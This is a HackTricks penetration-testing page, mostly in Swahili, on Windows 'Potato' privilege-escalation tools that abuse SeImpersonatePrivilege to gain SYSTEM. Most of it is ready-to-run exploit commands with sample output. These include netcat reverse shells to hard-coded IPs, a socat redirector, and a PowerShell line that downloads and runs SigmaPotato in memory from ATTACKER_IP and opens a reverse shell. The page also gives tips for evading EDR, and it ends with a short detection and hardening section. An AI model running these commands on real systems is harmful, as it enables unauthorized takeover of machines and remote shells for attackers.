# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato haifanyi kazi** kwenye Windows Server 2019 na Windows 10 build 1809 na baadaye. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** zinaweza kutumika kupata vibali sawa na kupata upatikanaji wa ngazi ya `NT AUTHORITY\SYSTEM`. Posti hii ya blogi (https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) inachunguza kwa kina zana ya `PrintSpoofer`, ambayo inaweza kutumika kuabusu vibali vya kuiga (impersonation) kwenye mashine za Windows 10 na Server 2019 ambapo JuicyPotato haifanyi kazi tena.

> [!TIP]
> Chaguo la kisasa linalodumishwa mara kwa mara katika 2024–2025 ni SigmaPotato (fork ya GodPotato) ambalo linaongeza matumizi ya in-memory/.NET reflection na msaada wa OS uliopanuliwa. Angalia matumizi ya haraka hapa chini na repo katika References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Mahitaji na mambo ya kuzingatia

Mbinu zote zinazofuata zinategemea kuabusu huduma yenye uwezo wa kuiga (impersonation-capable) yenye vibali kutoka kwa muktadha unaoshikilia moja ya vibali vifuatavyo:

- SeImpersonatePrivilege (ya kawaida zaidi) au SeAssignPrimaryTokenPrivilege
- High integrity haitegemeeki ikiwa token tayari ina SeImpersonatePrivilege (kawaida kwa akaunti nyingi za service kama IIS AppPool, MSSQL, n.k.)

Angalia vibali haraka:
```cmd
whoami /priv | findstr /i impersonate
```
Vidokezo vya uendeshaji:

- PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). Katika mazingira yaliyothibitishwa kwa usalama ambapo Spooler imezimwa baada ya PrintNightmare, pendelea RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requires an OXID resolver reachable on TCP/135. Ikiwa egress imezuiwa, tumia redirector/port-forwarder (see example below). Older builds needed the -f flag.
- EfsPotato/SharpEfsPotato hutumia MS-EFSR; ikiwa pipe moja imezuiwa, jaribu pipes mbadala (lsarpc, efsrpc, samr, lsass, netlogon).
- Kosa 0x6d3 wakati wa RpcBindingSetAuthInfo kawaida inaonyesha huduma ya uthibitishaji ya RPC isiyojulikana/isiyoungwa mkono; jaribu pipe/transport tofauti au hakikisha huduma ya lengo inaendeshwa.

## Demo ya Haraka

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Vidokezo:
- Unaweza kutumia -i kuzindua mchakato wa mwingiliano katika console ya sasa, au -c kuendesha one-liner.
- Inahitaji Spooler service. Ikiwa imezimwa, hii itashindwa.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Ikiwa outbound 135 imezuiwa, pivot OXID resolver kupitia socat kwenye redirector yako:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Kidokezo: Ikiwa pipe moja itashindwa au EDR itazuia, jaribu pipes nyingine zinazounga mkono:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Vidokezo:
- Inafanya kazi kwenye Windows 8/8.1–11 na Server 2012–2022 wakati SeImpersonatePrivilege ipo.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato inatoa aina mbili zinazolenga obyekti za DCOM za huduma ambazo kwa chaguo-msingi huwa na RPC_C_IMP_LEVEL_IMPERSONATE. Jenga au tumia binaries zilizotolewa na endesha amri yako:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (tawi la GodPotato lililosasishwa)

SigmaPotato inaongeza vipengele vya kisasa kama in-memory execution kupitia .NET reflection na msaidizi wa PowerShell reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Vidokezo vya utambuzi na kuimarisha usalama

- Fuatilia michakato inayounda named pipes na mara moja kuita token-duplication APIs ikifuatiwa na CreateProcessAsUser/CreateProcessWithTokenW. Sysmon inaweza kuonyesha telemetry muhimu: Event ID 1 (process creation), 17/18 (named pipe created/connected), na command lines zinazozalisha child processes kama SYSTEM.
- Kuimarisha Spooler: Kuzima huduma ya Print Spooler kwenye servers ambapo haifai kunahitajika kunazuia coerctions za ndani za aina ya PrintSpoofer kupitia spoolss.
- Kuimarisha akaunti za huduma: Punguza utoaji wa SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege kwa custom services. Fikiria kuendesha services chini ya virtual accounts zenye least privileges zinazohitajika na kuzitenga kwa kutumia service SID na write-restricted tokens inapowezekana.
- Udhibiti wa mtandao: Kuzuia outbound TCP/135 au kupunguza trafiki ya RPC endpoint mapper kunaweza kuvunja RoguePotato isipokuwa internal redirector inapatikane.
- EDR/AV: Zana hizi zote zina saini zinazotambulika kwa wingi. Recompiling kutoka source, kubadilisha symbols/strings, au kutumia in-memory execution kunaweza kupunguza utambuzi lakini haitavunja behavioral detections thabiti.

## Marejeo

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
